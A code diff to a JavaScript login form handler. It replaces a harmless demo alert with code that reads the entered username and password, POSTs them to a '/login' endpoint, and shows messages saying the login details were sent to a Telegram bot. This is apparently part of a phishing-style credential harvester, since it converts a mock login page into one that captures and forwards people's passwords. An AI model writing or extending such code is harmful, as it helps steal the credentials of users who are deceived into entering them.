@@ -1,11 +1,20 @@
-// This script prevents the form from submitting as a real login
 document.getElementById("loginForm").addEventListener("submit", function(event) {
-    // Prevent the form from submitting the traditional way
-    event.preventDefault();
+    event.preventDefault(); // Prevent the form from submitting
     
-    // Optional: Display a message
-    alert("Form submitted for demonstration. In a real application, your data would be processed.");
-
-    // You can redirect to another page if needed
-    // window.location.href = "thank-you.html";
+    // Get the username and password from the form
+    var username = document.getElementById("username").value;
+    var password = document.getElementById("password").value;
+    
+    // Make an AJAX request to the server-side endpoint
+    var xhr = new XMLHttpRequest();
+    xhr.open("POST", "/login", true);
+    xhr.setRequestHeader("Content-Type", "application/json");
+    xhr.onreadystatechange = function() {
+        if (xhr.readyState === 4 && xhr.status === 200) {
+            alert("Login details sent to Telegram bot successfully!");
+        } else {
+            alert("Failed to send login details to Telegram bot.");
+        }
+    };
+    xhr.send(JSON.stringify({username: username, password: password}));
 });
